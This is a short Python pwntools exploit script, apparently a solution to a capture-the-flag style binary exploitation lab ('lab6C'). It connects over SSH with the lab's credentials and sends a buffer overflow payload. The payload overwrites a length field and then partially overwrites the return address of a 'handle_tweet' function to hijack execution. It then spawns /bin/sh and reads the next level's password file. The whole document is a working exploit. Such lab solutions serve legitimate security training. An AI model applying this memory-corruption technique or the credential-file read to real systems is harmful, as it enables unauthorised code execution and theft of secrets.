from pwn import *

s = ssh(host = '192.168.147.134', user = 'lab6C', password = 'lab06start')
r = s.process(b"/levels/lab06/lab6C")

r.recvuntil(b'Enter your username\n')
payload = b'A' * 40
payload += b'\xc6' # overwrite save->msglen in order to copy 198 bytes from the original buffer
r.sendline(payload)

payload = b'A' * 196
payload += b'\x2b\x07' #partial overwrite the return address of handle_tweet
r.sendline(payload)
r.sendline(b'/bin/sh\x00')
r.sendline(b'cat /home/lab6B/.pass')

r.interactive()

